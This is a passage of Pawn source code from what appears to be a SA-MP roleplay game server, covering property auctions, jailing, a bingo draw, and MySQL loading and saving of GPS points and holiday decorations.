		    II[ PlayerInfo[ id ][ xProperty ][ 0 ] ][ iOwned ] = 0;
		    II[ PlayerInfo[ id ][ xProperty ][ 0 ] ][ iOnAuction ] = true;
		    II[ PlayerInfo[ id ][ xProperty ][ 0 ] ][ iNeaktivnost ] = 0;
		    II[ PlayerInfo[ id ][ xProperty ][ 0 ] ][ iOwnerSQLID ] = -1;
		    strmid( II[ PlayerInfo[ id ][ xProperty ][ 0 ] ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			PropertyRefresh( PlayerInfo[ id ][ xProperty ][ 0 ] );
			SaveProperty( PlayerInfo[ id ][ xProperty ][ 0 ] );
		}
		if( PlayerInfo[ id ][ xProperty ][ 1 ] != -1 && strcmp( ImeIgraca( id ), II[ PlayerInfo[ id ][ xProperty ][ 1 ] ][ iOwner ], true) == 0) {

		    II[ PlayerInfo[ id ][ xProperty ][ 1 ] ][ iOwned ] = 0;
		    II[ PlayerInfo[ id ][ xProperty ][ 1 ] ][ iOnAuction ] = true;
		    II[ PlayerInfo[ id ][ xProperty ][ 1 ] ][ iNeaktivnost ] = 0;
		    II[ PlayerInfo[ id ][ xProperty ][ 1 ] ][ iOwnerSQLID ] = -1;
		    strmid( II[ PlayerInfo[ id ][ xProperty ][ 1 ] ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			PropertyRefresh( PlayerInfo[ id ][ xProperty ][ 1 ] );
			SaveProperty( PlayerInfo[ id ][ xProperty ][ 1 ] );
		}
		if( PlayerInfo[ id ][ xProperty ][ 2 ] != -1 && strcmp( ImeIgraca( id ), II[ PlayerInfo[ id ][ xProperty ][ 2 ] ][ iOwner ], true) == 0)
		{
		    II[ PlayerInfo[ id ][ xProperty ][ 2 ] ][ iOwned ] = 0;
		    II[ PlayerInfo[ id ][ xProperty ][ 2 ] ][ iOnAuction ] = true;
		    II[ PlayerInfo[ id ][ xProperty ][ 2 ] ][ iNeaktivnost ] = 0;
		    II[ PlayerInfo[ id ][ xProperty ][ 2 ] ][ iOwnerSQLID ] = -1;
		    strmid( II[ PlayerInfo[ id ][ xProperty ][ 2 ] ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			PropertyRefresh( PlayerInfo[ id ][ xProperty ][ 2 ] );
			SaveProperty( PlayerInfo[ id ][ xProperty ][ 2 ] );
		}
		if( PlayerInfo[ id ][ xFirmaID ] != -1 && strcmp( ImeIgraca( id ), BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bOwner ], true) == 0)
		{
            BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bOwner_sqlID ] = -1;
            BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bOnAuction ] = true;
			BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bNeaktivnost ] = 0;
			BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bFacture ] = 100;
	    	strmid( BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
			Bussines_Refresh( PlayerInfo[ id ][ xFirmaID ] );

			new q[ 256 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
				BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bOwner_sqlID ],
				BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bOwner ],
				BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bNeaktivnost ],
				BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bFacture ],
				BusinessInfo[ PlayerInfo[ id ][ xFirmaID ] ][ b_ID ] );

	   		mysql_tquery( mSQL, q);
		}

		new c = IVI;
		for( new j = 0; j < MAX_VEH_SLOT; j++ )
		{
		    if( player_veh[ id ][ vehicle_id ][ j ] != -1 && strcmp( ImeIgraca( id ), VehicleInfo[ player_veh[ id ][ vehicle_id ][ j ] ][ vOwner ], true) == 0)
			{
				c = player_veh[ id ][ vehicle_id ][ j ];
				if( c != IVI )
				{
					sql_vehicles_delete( c );
					ResetVehicle( c );
					SMG_DestroyVehicle( c );
				}
			}
		}
	}
	return 1;
}

_:public UcitajObjekte( playerid )
{
	SMG_TogglePlayerControllable( playerid, false );
	SendInfoMessage(playerid, "Ucitavanje objekata, molimo sacekajte...");
    SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);
	return 1;
}

forward SMG_SetPlayerPos(playerid, Float:x, Float:y, Float:z, bool:safePort = false); 
stock SMG_SetPlayerPos(playerid, Float:x, Float:y, Float:z, bool:safePort = false)
{
	new Float:tmpZ = safePort ? 1000.0 : 0.0;

	SetPlayerPos(playerid, x, y, z += tmpZ);

	if(safePort) 
	{
		Streamer_UpdateEx(playerid, x, y, z, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid), STREAMER_TYPE_OBJECT);
		SetPlayerTimerEx(playerid, "TeleportPlayerSafe", 500, false, "i", playerid);
	}
	if(GetPlayerVirtualWorld(playerid) == 187) { //Provjera za igraonicu
    	SetPlayerInterior(playerid, 0);
    }
	return 1;
}

_:public TeleportPlayerSafe(playerid)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	SMG_SetPlayerPos(playerid, x, y, z - 1000.0);
	return 1;
}

_:public JailPlayer( id, time )
{
	ResetPlayerWeapons( id );
	PlayerInfo[ id ][ xZatvor ] = JAIL;
	PlayerInfo[ id ][ xZatvorVreme ] = time;
	ClearAnimations( id );
	PlayerCP[ id ] = 0;
	PlayerInvited[ id ] = 0;
	if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_MAIN ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_MAIN );
	SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
	PlayerCuffed[ id ] = 0;

	new rand = random( sizeof( RandomZatvor ) );
	SMG_SetPlayerPos( id, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
	PlayerInfo[ id ][ xWanted ] = 0;
	SMG_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
	strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
	strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
	strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
 	UcitajObjekte( id );
	SetCameraBehindPlayer( id );
	SetPlayerInterior( id, 0 );
	SetPlayerVirtualWorld( id, 0 );

	new q[ 200 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '%d', `jail_time` = '%d', `wanted_level` = '%d' WHERE `user_id` = '%d' LIMIT 1",
		PlayerInfo[ id ][ xZatvor ],
		PlayerInfo[ id ][ xZatvorVreme ],
		PlayerInfo[ id ][ xWanted ],
		PlayerInfo[ id ][ xID ] );
	mysql_tquery( mSQL, q);
}

_:public CreateDroppedGun( GunID, GunAmmo, Float:gPosXx, Float:gPosYx, Float:gPosZx )
{
    for( new a = 0; a < MAX_GOBJ; a++ )
	{
        if( dGunData[ a ][ ObjPos ][ 0 ] == 0.0 )
		{
            dGunData[ a ][ ObjData ][ 0 ] = GunID;
			dGunData[ a ][ ObjData ][ 1 ] = GunAmmo;
			dGunData[ a ][ ObjPos ][ 0 ] = gPosXx;
			dGunData[ a ][ ObjPos ][ 1 ] = gPosYx;
			dGunData[ a ][ ObjPos ][ 2 ] = gPosZx;
			dGunData[ a ][ gObjID ] = CreateDynamicObject( WeaponInfos[ GunID ][ wModel ], dGunData[ a ][ ObjPos ][ 0 ], dGunData[ a ][ ObjPos ][ 1 ], dGunData[ a ][ ObjPos ][ 2 ]-1, 93.7, 120.0, random(360) );
            return 1;
		}
    }
	return 1;
}

new OneSeatVehicles[ 38 ] =
{
    425, 430, 432, 441, 446, 448, 452, 453,
	454, 464, 465, 472, 473, 476, 481, 484,
	485, 486, 493, 501, 509, 510, 519, 520,
	530, 531, 532, 539, 553, 564, 568, 571,
	572, 574, 583, 592, 594, 595
};

_:public IsSeatAvailable( vehicleid, seat)
{
	new carmodel = GetVehicleModel( vehicleid);
	for(new i = 0; i < sizeof( OneSeatVehicles ); i++ )
	{
	    if( carmodel == OneSeatVehicles[i] ) return(false);
	}

	foreach(new i : Player)
	{
	    if(GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == seat) return(false);
	}
	return 1;
}

//------------------------------------------------------------------------------

_:public Javno3( playerid ) {

    if(IsPlayerConnected( playerid ) )
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1505.9548,-1741.5792,13.5469) || IsPlayerInRangeOfPoint(playerid, 10,1504.6154,-1741.4963,13.5469) || IsPlayerInRangeOfPoint(playerid, 10,1497.7278,-1733.2307,13.3828) || IsPlayerInRangeOfPoint(playerid, 10,1491.7355,-1738.8771,14.1983) || IsPlayerInRangeOfPoint(playerid, 10,1480.0619,-1741.7356,13.6287) || IsPlayerInRangeOfPoint(playerid, 10,1471.7213,-1740.6451,14.3646))
		{
  			return 1;
		}
	}
	return(false);
}

_:public Javno4(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1458.7819,-1739.5323,13.9193) || IsPlayerInRangeOfPoint(playerid, 10,1451.9343,-1732.9948,14.2465) || IsPlayerInRangeOfPoint(playerid, 10,1455.6887,-1728.3517,14.0456) || IsPlayerInRangeOfPoint(playerid, 10,1470.7139,-1752.2955,15.4453) || IsPlayerInRangeOfPoint(playerid, 10,1478.5802,-1754.8750,17.4498) || IsPlayerInRangeOfPoint(playerid, 10,1490.0334,-1755.7047,17.4401))
		{
  			return 1;
		}
	}
	return(false);
}

_:public Javno5(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1483.5298,-1762.2010,18.7289) || IsPlayerInRangeOfPoint(playerid, 10,1475.8184,-1767.5063,18.7958) || IsPlayerInRangeOfPoint(playerid, 10,1224.2733,-930.6243,42.5903) || IsPlayerInRangeOfPoint(playerid, 10,1232.1556,-929.4727,42.5212) || IsPlayerInRangeOfPoint(playerid, 10,1218.4210,-931.0319,42.9727) || IsPlayerInRangeOfPoint(playerid, 10,1209.4436,-926.8596,42.9230))
		{
  			return 1;
		}
	}
	return(false);
}

_:public Javno6(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1205.9155,-920.4095,43.0673) || IsPlayerInRangeOfPoint(playerid, 10,1195.8317,-921.3834,43.8945) || IsPlayerInRangeOfPoint(playerid, 10,1181.4392,-915.1285,43.2192) || IsPlayerInRangeOfPoint(playerid, 10,1177.5984,-899.8451,44.1480) || IsPlayerInRangeOfPoint(playerid, 10,1180.8157,-887.0159,43.4167) || IsPlayerInRangeOfPoint(playerid, 10,1190.9819,-883.4169,43.2069))
		{
  			return 1;
		}
	}
	return(false);
}

_:public Javno7(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1205.1240,-881.5010,42.9346) || IsPlayerInRangeOfPoint(playerid, 10,1217.4341,-882.3506,42.9045) || IsPlayerInRangeOfPoint(playerid, 10,1223.5906,-892.5105,43.4221) || IsPlayerInRangeOfPoint(playerid, 10,1226.6726,-911.0240,42.9017))
		{
  			return 1;
		}
	}
	return(false);
}

_:public Javno8(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 40,1218.4386,-1334.5829,13.4835) || IsPlayerInRangeOfPoint(playerid, 10,1219.6810,-932.0195,42.6316) || IsPlayerInRangeOfPoint(playerid, 10,1481.5367,-1732.5997,13.3828) || IsPlayerInRangeOfPoint(playerid, 10,1544.8290,-2324.2332,13.5547) || IsPlayerInRangeOfPoint(playerid, 10,1198.5538,-1325.6200,13.3984))
		{
  			return 1;
		}
	}
	return(false);
}

_:public StopLoopingAnim( playerid )
{
    usingAnimation[ playerid ] = false;
    ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0 );
}

_:public randomExx(const iMin, const iMax)
{
	return random(iMax - iMin) + iMin;
}

//------------------------------------------------------------------------------

public OnRconLoginAttempt(ip[], password[], success)
{
    if(strfind(password, "%", true) != -1) return 1;

    new ip2[144];
	if(success)
	{
   	    foreach(new i : Player)
 		{
   	        GetPlayerIp(i, ip2, sizeof(ip2));
     		if(!strcmp(ip, ip2, true))
			{
				ShowPlayerDialog(i, dialog_SECURERCON, DIALOG_STYLE_INPUT, D_NASLOV, "Unesite drugu provjeru RCON logina:", "Login", "Ban");
			}
		}
	}
    return 1;
}

_:public IzvlacenjeKuglice()
{
	new 
		bBroj = randomExx( 1, 100 ),
		bNagrada = ( 400000+random( 100000 ) ),
		ImaNagrade = 0,
		Dobitnik;

	SendClientMessageToAll( 0x5FCE77FF, "(BINGO): Izvlacenje broja je zavrseno." );
    SendClientMessageToAllEx( 0x5FCE77FF, "(BINGO): Izvuceni broj je {FFFFFF}(%d).", bBroj );

	foreach(new i : Player)
	{
       	if( PlayerInfo[ i ][ xBingoNumber ] == bBroj )
		{
           	PlayerInfo[ i ][ xBingoMoney ] += bNagrada;
			sql_user_update_integer( i, "xBingoMoney", PlayerInfo[ i ][ xBingoMoney ] );
           	ImaNagrade = 1;
           	Dobitnik = i;
		}
       	if( ImaNagrade == 1 )
   		{
		    SCMF( i, 0x5FCE77FF, "(BINGO - WIN): CESTITKE, imamo dobitnika... {FFFFFF}%s.", ImeIgraca( Dobitnik ) );
            SCMF( i, 0x5FCE77FF, "(BINGO - WIN): {FFFFFF}Osvojena nagrada iznosi {FFFFFF}(%d).", bNagrada );
		}
		PlayerInfo[ i ][ xBingoNumber ] = 0;
		sql_user_update_integer( i, "xBingoNumber", PlayerInfo[ i ][ xBingoNumber ] );
	}
	if( ImaNagrade == 0 )
	{
	    SendClientMessageToAll( 0x5FCE77FF, "(BINGO): Nazalost, nemamo dobitnika." );
	}
	return 1;
}

//------------------------------------------------------------------------------

_:public GetFactionType( playerid )
{
	if( PlayerInfo[ playerid ][ xClan ] == 0 ) return(false);
	return ( org_info[ PlayerInfo[ playerid ][ xClan ] ][ oTip ] );
}

//------------------------------------------------------------------------------

const EX_SPLITLENGTH = 144;
SCMF(playerid, color, const str[], { Float,_ }:...)
{
	static args, start, end, string[144];
	#emit LOAD.S.pri 8
	#emit STOR.pri args

	if(args > 12)
	{
		#emit ADDR.pri str
		#emit STOR.pri start

	    for (end = start + (args - 12); end > start; end -= 4)
		{
	        #emit LREF.pri end
	        #emit PUSH.pri
		}
		#emit PUSH.S str
		#emit PUSH.C 144
		#emit PUSH.C string
		#emit PUSH.C args
		#emit SYSREQ.C format

        new buffer[ EX_SPLITLENGTH+5 ];
    	new len = strlen( string );
		if( len> EX_SPLITLENGTH )
		{
	        new times = ( len/EX_SPLITLENGTH );
	        for(new i = 0; i < times+1; i++)
			{
	            strdel(buffer, 0, EX_SPLITLENGTH+5);
	            if( len-(i*EX_SPLITLENGTH)>EX_SPLITLENGTH )
				{
			        strmid( buffer, string, EX_SPLITLENGTH*i, EX_SPLITLENGTH*(i+1) );
	                format( buffer, sizeof( buffer ), "%s ...", buffer );
	            }
	            else
	            {
	                strmid( buffer, string, EX_SPLITLENGTH*i, len);
	                format( buffer, sizeof( buffer ), "... %s", buffer );
	            }
	            SendClientMessage(playerid, color, buffer);
	        }
	    }
	    else
		{
	        SendClientMessage(playerid, color, string);
	    }

		#emit LCTRL 5
		#emit SCTRL 4
		#emit RETN
	}
	else
	{
	    new buffer[ EX_SPLITLENGTH+5 ];
    	new len = strlen( str );
		if( len > EX_SPLITLENGTH )
		{
	        new times = ( len/EX_SPLITLENGTH );
	        for(new i = 0; i < times+1; i++)
			{
	            strdel(buffer, 0, EX_SPLITLENGTH+5);
	            if( len-(i*EX_SPLITLENGTH)>EX_SPLITLENGTH )
				{
	                strmid( buffer, str, EX_SPLITLENGTH*i, EX_SPLITLENGTH*(i+1) );
	                format( buffer, sizeof( buffer ), "%s ...", buffer );
	            }
	            else
	            {
	                strmid(buffer, str, EX_SPLITLENGTH*i, len);
	                format( buffer, sizeof( buffer ), "... %s", buffer );
	            }
	            SendClientMessage(playerid, color, buffer);
	        }
	    }
	    else
	    {
	        SendClientMessage(playerid, color, str);
	    }
	}
	return 1;
}

SendClientMessageToAllEx(color, const text[], {Float,_}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    SendClientMessageToAll(color, text);
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		SendClientMessageToAll(color, str);

		#emit RETN
	}
	return 1;
}

//------------------------------------------------------------------------------

_:public PlayerHasTazer( playerid )
{
	return ( GetWeapon( playerid ) == 23 && ImaTazer[ playerid ] );
}

//------------------------------------------------------------------------------

_:public mSQL_CreateTiki( createID )
{
	static q[120];
    mysql_format( mSQL, q, sizeof( q ), "INSERT INTO `tiki` (tPosX, tPosY, tPosZ) VALUES( '%f', '%f', '%f' )", TikiInfo[ createID ][ tPosX ], TikiInfo[ createID ][ tPosY ], TikiInfo[ createID ][ tPosZ ] );
    mysql_pquery( mSQL, q, "OnTikiCreated", "i", createID );

    Iter_Add(iter_Tiki, createID);
	return 1;
}
_:public OnTikiCreated( createID )
{
	TikiInfo[ createID ][ tID ] = cache_insert_id();
	return 1;
}
// --
_:public OnTikisLoad( )
{
	new rows, fields, thisID;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			thisID = Iter_Free(iter_Tiki);

            TikiInfo[ thisID ][ tID ] 			= cache_get_field_content_int( i, "tID" );
            TikiInfo[ thisID ][ tPosX ] 		= cache_get_field_content_float( i, "tPosX" );
            TikiInfo[ thisID ][ tPosY ] 		= cache_get_field_content_float( i, "tPosY" );
            TikiInfo[ thisID ][ tPosZ ] 		= cache_get_field_content_float( i, "tPosZ" );

            Iter_Add(iter_Tiki, thisID);
		}
	}
	printf("(U) SQL: Ucitao - Tiki(%d)", rows);
	return 1;
}

//------------------------------------------------------------------------------

_:public mSQL_CreateGPS( createID )
{
	static q[333];
    mysql_format( mSQL, q, sizeof( q ),

		"INSERT INTO `gps` ( gpsName, gpsPos1, gpsPos2, gpsPos3 ) \
		VALUES( '%s', '%f', '%f', '%f' )",

        gpsInfo[ createID ][ gpsName ],
		gpsInfo[ createID ][ gpsPos ][ 0 ], gpsInfo[ createID ][ gpsPos ][ 1 ], gpsInfo[ createID ][ gpsPos ][ 2 ] );

    mysql_pquery( mSQL, q, "OnGPSCreated", "i", createID );
	return 1;
}
_:public OnGPSCreated( createID )
{
	gpsInfo[ createID ][ gpsSQLID ] = cache_insert_id();
	return 1;
}
// --
_:public OnGPSsLoad( )
{
	new rows, fields, thisID;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			thisID = Iter_Free(iter_GPS);

            gpsInfo[ thisID ][ gpsSQLID ] 			= cache_get_field_content_int( i, "gpsSQLID" );
            gpsInfo[ thisID ][ gpsPos ][ 0 ] 		= cache_get_field_content_float( i, "gpsPos1" );
            gpsInfo[ thisID ][ gpsPos ][ 1 ] 		= cache_get_field_content_float( i, "gpsPos2" );
            gpsInfo[ thisID ][ gpsPos ][ 2 ] 		= cache_get_field_content_float( i, "gpsPos3" );

            cache_get_field_content( i, "gpsName", gpsInfo[ thisID ][ gpsName ], mSQL, 50 );

            Iter_Add(iter_GPS, thisID);
		}
	}
	printf("(U) SQL: Ucitao - GPS(%d)", rows);
	return 1;
}
// --
_:public GPS_Save( id )
{
	static q[300];
	mysql_format(mSQL, q, 300,

	    "UPDATE `gps` SET `gpsName` = '%s', `gpsPos1` = '%f', `gpsPos2` = '%f', `gpsPos3` = '%f'\
	    WHERE `gpsSQLID` = '%d'",

		gpsInfo[id][gpsName], gpsInfo[id][gpsPos][0], gpsInfo[id][gpsPos][1], gpsInfo[id][gpsPos][2], gpsInfo[id][gpsSQLID]);

	mysql_tquery(mSQL, q);
	return 1;
}

//------------------------------------------------------------------------------

GetNearestPresent(playerid) 
{
	new Float:p_Pos[3], Float:maxradius = 3.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_Present)
    {
        if(VectorSize(p_Pos[0] - presentsInfo[i][presPos][0], p_Pos[1] - presentsInfo[i][presPos][1], p_Pos[2] - presentsInfo[i][presPos][2]) >= maxradius) continue;

        id = i;
        maxradius = VectorSize(p_Pos[0] - presentsInfo[i][presPos][0], p_Pos[1] - presentsInfo[i][presPos][1], p_Pos[2] - presentsInfo[i][presPos][2]);
    }
    return id;
}
// --
_:public mSQL_CreatePresent( createID )
{
	static q[500];
    mysql_format( mSQL, q, sizeof( q ),

		"INSERT INTO `xmas_presents` ( presTaken, presPlaced, presPos1, presPos2, presPos3, presPos4, presPos5, presPos6 ) \
	 	VALUES( '%d', '%d', '%f', '%f', '%f', '%f', '%f', '%f' )",

        presentsInfo[ createID ][ presTaken ], presentsInfo[ createID ][ presPlaced ],
        presentsInfo[ createID ][ presPos ][ 0 ], presentsInfo[ createID ][ presPos ][ 1 ], presentsInfo[ createID ][ presPos ][ 2 ],
        presentsInfo[ createID ][ presPos ][ 3 ], presentsInfo[ createID ][ presPos ][ 4 ], presentsInfo[ createID ][ presPos ][ 5 ] );

    mysql_pquery( mSQL, q, "OnPresentCreated", "i", createID );
	return 1;
}
_:public OnPresentCreated( createID )
{
	presentsInfo[ createID ][ presSQLID ] = cache_insert_id();
	return 1;
}
// --
_:public OnPresentsLoad( )
{
	new rows, fields, thisID;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			thisID = Iter_Free(iter_Present);

            presentsInfo[ thisID ][ presSQLID ] 		= cache_get_field_content_int( i, "presSQLID" );
            presentsInfo[ thisID ][ presTaken ] 		= bool:cache_get_field_content_int( i, "presTaken" );
            presentsInfo[ thisID ][ presPlaced ] 		= bool:cache_get_field_content_int( i, "presPlaced" );
            presentsInfo[ thisID ][ presPos ][ 0 ]		= cache_get_field_content_float( i, "presPos1" );
            presentsInfo[ thisID ][ presPos ][ 1 ]		= cache_get_field_content_float( i, "presPos2" );
            presentsInfo[ thisID ][ presPos ][ 2 ]		= cache_get_field_content_float( i, "presPos3" );
            presentsInfo[ thisID ][ presPos ][ 3 ]		= cache_get_field_content_float( i, "presPos4" );
            presentsInfo[ thisID ][ presPos ][ 4 ]		= cache_get_field_content_float( i, "presPos5" );
            presentsInfo[ thisID ][ presPos ][ 5 ]		= cache_get_field_content_float( i, "presPos6" );

			if( presentsInfo[ thisID ][ presPlaced ] )
			{
				new 
					object = 19054,
					rand = random(5);

			    switch( rand )
				{
					case 0: object = 19054;
					case 1: object = 19055;
					case 2: object = 19056;
					case 3: object = 19057;
					case 4: object = 19058;
				}

				if( !presentsInfo[ thisID ][ presTaken ] )
				{
					presentsInfo[ thisID ][ pres3d ] = CreateDynamic3DTextLabel( "Paketici\n{FFFFFF}Ovaj paketic nije otvoren.\n\n{00FF00}Da otvorite paketic kucajte\n{FFFFFF}\"/poklon\"", 0x00FF00FF, presentsInfo[ thisID ][ presPos ][ 0 ], presentsInfo[ thisID ][ presPos ][ 1 ], presentsInfo[ thisID ][ presPos ][ 2 ], 8.0, IPI, IVI, 0, 0, 0 );
					presentsInfo[ thisID ][ presObject ] = CreateDynamicObject( object, presentsInfo[ thisID ][ presPos ][ 0 ], presentsInfo[ thisID ][ presPos ][ 1 ], presentsInfo[ thisID ][ presPos ][ 2 ], presentsInfo[ thisID ][ presPos ][ 3 ], presentsInfo[ thisID ][ presPos ][ 4 ], presentsInfo[ thisID ][ presPos ][ 5 ] );
				}
				else if( presentsInfo[ thisID ][ presTaken ] )
				{
					presentsInfo[ thisID ][ pres3d ] = CreateDynamic3DTextLabel( "Paketici\n{FFFFFF}Ovaj paketic je otvoren :(", 0xFF0000FF, presentsInfo[ thisID ][ presPos ][ 0 ], presentsInfo[ thisID ][ presPos ][ 1 ], presentsInfo[ thisID ][ presPos ][ 2 ], 8.0, IPI, IVI, 0, 0, 0 );
					presentsInfo[ thisID ][ presObject ] = CreateDynamicObject( object, presentsInfo[ thisID ][ presPos ][ 0 ], presentsInfo[ thisID ][ presPos ][ 1 ], presentsInfo[ thisID ][ presPos ][ 2 ], presentsInfo[ thisID ][ presPos ][ 3 ], presentsInfo[ thisID ][ presPos ][ 4 ], presentsInfo[ thisID ][ presPos ][ 5 ] );
				}
			}

			Iter_Add(iter_Present, thisID);
		}
	}
	printf("(U) SQL: Ucitao - Pokloni(%d)", rows);
	return 1;
}
// --
_:public SavePresent( id )
{
	static q[500];
	mysql_format(mSQL, q, sizeof(q),

		"UPDATE `xmas_presents` SET `presTaken` = '%d', `presPlaced` = '%d', `presPos1` = '%f', `presPos2` = '%f', `presPos3` = '%f', `presPos4` = '%f', `presPos5` = '%f', `presPos6` = '%f'\
		WHERE `presSQLID` = '%d'",

			presentsInfo[id][presTaken], presentsInfo[id][presPlaced], presentsInfo[id][presPos][0], presentsInfo[id][presPos][1], presentsInfo[id][presPos][2],
			presentsInfo[id][presPos][3], presentsInfo[id][presPos][4], presentsInfo[id][presPos][5], presentsInfo[id][presSQLID]);

	mysql_tquery(mSQL, q);
	return 1;
}

//------------------------------------------------------------------------------

GetNearestCTree(playerid)
{
	new Float:p_Pos[3], Float:maxradius = 3.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_CTree)
    {
        if(VectorSize(p_Pos[0] - CTree[i][ctPos][0], p_Pos[1] - CTree[i][ctPos][1], p_Pos[2] - CTree[i][ctPos][2]) >= maxradius) continue;

        id = i;
        maxradius = VectorSize(p_Pos[0] - CTree[i][ctPos][0], p_Pos[1] - CTree[i][ctPos][1], p_Pos[2] - CTree[i][ctPos][2]);
    }
    return id;
}
// --
_:public mSQL_CreateTrees( createID )
{
	static q[500];
    mysql_format( mSQL, q, sizeof( q ),

		"INSERT INTO `xmas_trees` ( ctPlaced, ctPos1, ctPos2, ctPos3, ctPos4, ctPos5, ctPos6 ) \
	 	VALUES( '%d', '%f', '%f', '%f', '%f', '%f', '%f' )",

        CTree[ createID ][ ctPlaced ],
        CTree[ createID ][ ctPos ][ 0 ], CTree[ createID ][ ctPos ][ 1 ], CTree[ createID ][ ctPos ][ 2 ],
        CTree[ createID ][ ctPos ][ 3 ], CTree[ createID ][ ctPos ][ 4 ], CTree[ createID ][ ctPos ][ 5 ] );

    mysql_pquery( mSQL, q, "OnTreeCreated", "i", createID );
	return 1;
}
_:public OnTreeCreated( createID )
{
	CTree[ createID ][ ctSQLID ] = cache_insert_id();
	return 1;
}
// --
_:public OnTreesLoad( )
{
	new rows, fields, thisID;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			thisID = Iter_Free(iter_CTree);

            CTree[ thisID ][ ctSQLID ] 			= cache_get_field_content_int( i, "ctSQLID" );
            CTree[ thisID ][ ctPlaced ] 		= bool:cache_get_field_content_int( i, "ctPlaced" );
            CTree[ thisID ][ ctPos ][ 0 ]		= cache_get_field_content_float( i, "ctPos1" );
            CTree[ thisID ][ ctPos ][ 1 ]		= cache_get_field_content_float( i, "ctPos2" );
            CTree[ thisID ][ ctPos ][ 2 ]		= cache_get_field_content_float( i, "ctPos3" );
            CTree[ thisID ][ ctPos ][ 3 ]		= cache_get_field_content_float( i, "ctPos4" );
            CTree[ thisID ][ ctPos ][ 4 ]		= cache_get_field_content_float( i, "ctPos5" );
            CTree[ thisID ][ ctPos ][ 5 ]		= cache_get_field_content_float( i, "ctPos6" );

			if( CTree[ thisID ][ ctPlaced ] )
			{
				CTree[ thisID ][ ct3d ] = CreateDynamic3DTextLabel("Novogodisnja Jelkica\n{FFFFFF}Zelimo Vam srecne Bozicne i novogodisnje praznike!\n\n{6EF83C}*** 2020 ***", 0x6EF83CFF, CTree[ thisID ][ ctPos ][ 0 ], CTree[ thisID ][ ctPos ][ 1 ], CTree[ thisID ][ ctPos ][ 2 ]+1.5, 3.0, IPI, IVI, 0, 0, 0 );
				CTree[ thisID ][ ctObject ] = CreateDynamicObject(19076, CTree[ thisID ][ ctPos ][ 0 ], CTree[ thisID ][ ctPos ][ 1 ], CTree[ thisID ][ ctPos ][ 2 ], CTree[ thisID ][ ctPos ][ 3 ], CTree[ thisID ][ ctPos ][ 4 ], CTree[ thisID ][ ctPos ][ 5 ] );
			}

			Iter_Add(iter_CTree, thisID);
		}
	}
	printf("(U) SQL: Ucitao - Jelke(%d)", rows);
	return 1;
}

//------------------------------------------------------------------------------

_:public TogPlayerHud( playerid )
{
	if( TogHud[ playerid ] )
	{
	    BuildIngameTextDraws(playerid, true);

		if( PlayerInfo[ playerid ][ xWanted ] > 0 ) PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 0 ] ), PlayerTextDrawShow( playerid, WantedLevel_pTD[ playerid ][ 1 ] );

        SMG_SetHealthBarVisible( playerid, true );

